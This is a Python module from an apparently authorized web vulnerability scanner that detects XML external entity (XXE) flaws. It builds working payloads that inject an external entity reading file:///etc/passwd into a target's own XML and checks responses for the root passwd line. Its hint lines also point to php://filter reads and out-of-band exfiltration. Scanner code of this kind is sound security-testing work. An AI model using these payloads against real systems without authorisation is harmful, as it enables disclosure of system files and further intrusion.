from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403

# ════════════════════════════════════════════════════════════════════════
#  XML EXTERNAL ENTITY (XXE)  — in-band / reflection-based
#
#  Only runs against endpoints that are genuinely XML (ip.body_is_xml), which
#  today means a raw request loaded with -r whose Content-Type is XML. We never
#  guess XML endpoints, so there is no speculative fan-out and no guessing FP.
#
#  Two independent classes:
#
#    xxe.entity_expand (STRONG)  a custom INTERNAL entity carrying a random
#                                token expands in the response (token present,
#                                literal "&ent;" absent) ⇒ the parser resolves
#                                entities at all. Necessary precondition.
#
#    xxe.file_read     (PROOF)   an EXTERNAL entity `SYSTEM "file:///etc/passwd"`
#                                surfaces the root-anchored passwd line, absent
#                                from baseline ⇒ arbitrary file disclosure. This
#                                is the unforgeable one.
#
#  entity_expand + file_read → two classes → CONFIRMED. file_read alone stays
#  TENTATIVE (clamped by min_classes), and entity_expand alone scores below the
#  reporting floor (entity processing without disclosure is not a finding).
#
#  NOTE: purely BLIND XXE (no reflection, hardened parser) is NOT detectable
#  in-band and is intentionally reported as nothing here — that case needs an
#  OAST/interaction server (a separate, planned capability).
# ════════════════════════════════════════════════════════════════════════


_XXE_PASSWD_ROOT_RE = re.compile(r"\broot:[^\n:]*:0:0:")


class XXEModule(_Module):
    name = vuln = "xxe"

    def requires(self, ip):
        return ip.dynamic and ip.body_is_xml

    @staticmethod
    def _send(http, ip, xml):
        ctype = ip.content_type or "application/xml"
        return http.post(ip.url, body=xml, headers={"Content-Type": ctype}, cache=False)

    # a leaf element: <tag ...>text-without-tags</tag>  (e.g. <X-Token>..</X-Token>)
    _LEAF_RE = re.compile(r'(<([A-Za-z_][\w:.\-]*)\b[^>]*>)([^<]*)(</\2>)')

    def probe(self, http, ip):
        if not self.requires(ip):
            return []
        sigs = []
        ent = "hnyx" + _rand(6)
        token = "TOK" + _rand(12)

        base = self._send(http, ip, ip.body or "<r/>")
        base_txt = base.text or ""
        base_root = bool(_XXE_PASSWD_ROOT_RE.search(base_txt))

        # class 1: internal entity expansion — try a generic doc AND the app's
        # own XML shape (the entity ref is placed inside leaf elements like
        # <X-Token>, which is what reflection-based apps actually echo back).
        expanded, expand_payload, expand_status = False, None, None
        for doc in self._docs(ip.body or "", ent, f'"{token}"'):
            r = self._send(http, ip, doc)
            t = r.text or ""
            if token in t and f"&{ent};" not in t:
                expanded, expand_payload, expand_status = True, doc, r.status
                break
        if expanded:
            sigs.append(Signal(
                self.vuln, "internal-entity-expand", "xxe.entity_expand",
                SignalStrength.STRONG,
                "XML parser expanded a custom internal entity",
                {"payload": expand_payload, "status": expand_status}))

        # class 2: external entity file read
        file_hit = self._file_read(http, ip, ent, base_root)
        if file_hit:
            payload, status = file_hit
            sigs.append(Signal(
                self.vuln, "external-entity-file", "xxe.file_read",
                SignalStrength.PROOF,
                f"external entity read /etc/passwd (root:...:0:0:) (HTTP {status})",
                {"payload": payload, "status": status}))

        if self._debug:
            UI.dim(f"      [xxe] {ip.url} expand={'Y' if expanded else 'n'} "
                   f"file={'Y' if file_hit else 'n'} base_root={base_root}")
        return sigs

    def _file_read(self, http, ip, ent, base_root):
        for doc in self._docs(ip.body or "", ent, 'SYSTEM "file:///etc/passwd"'):
            r = self._send(http, ip, doc)
            if (not base_root) and _XXE_PASSWD_ROOT_RE.search(r.text or ""):
                return doc, r.status
        return None

    @classmethod
    def _docs(cls, body, ent, decl):
        """Build the payloads to try for one entity declaration `decl` (either
        an internal value like '"TOK.."' or 'SYSTEM "file:///etc/passwd"').

        Order matters — most-likely-to-reflect first:
          1. the app's own XML with &ent; injected into EVERY leaf element,
          2. the same but only the LAST leaf (if multi-inject upsets a strict
             parser/validator),
          3. a generic <r>&ent;</r> doc as a last resort.
        """
        doctype = f'<!DOCTYPE r [<!ENTITY {ent} {decl}>]>'
        docs = []
        body = body or ""
        if body.strip():
            m = re.match(r"\s*<\?xml[^>]*\?>", body)
            head, rest = (body[:m.end()], body[m.end():]) if m else ("", body)
            matches = list(cls._LEAF_RE.finditer(rest))
            if matches:
                inj_all = cls._LEAF_RE.sub(
                    lambda g: g.group(1) + f"&{ent};" + g.group(4), rest)
                docs.append(head + doctype + inj_all)
                if len(matches) > 1:
                    last = matches[-1]
                    inj_last = (rest[:last.start()] + last.group(1) + f"&{ent};"
                                + last.group(4) + rest[last.end():])
                    docs.append(head + doctype + inj_last)
            else:
                docs.append(head + doctype + rest + f"<r>&{ent};</r>")
        docs.append(f'<?xml version="1.0"?>{doctype}<r>&{ent};</r>')
        return docs


def phase_xxe(target, config, runner):
    return _vuln_phase(target, config, runner, "xxe")


def _xxe_exploit_lines(techniques):
    return [
        "impact : arbitrary file read; often SSRF / OOB exfil via parameter entities",
        "verify : swap file:///etc/passwd for a php://filter source read, or use",
        "         an OAST host in an external DTD for blind cases — authorized only",
    ]


def _r_xxe(d):
    return _r_injection("XXE (XML external entity)", d, exploit=_xxe_exploit_lines)


INJECTION_MODULES.append(XXEModule)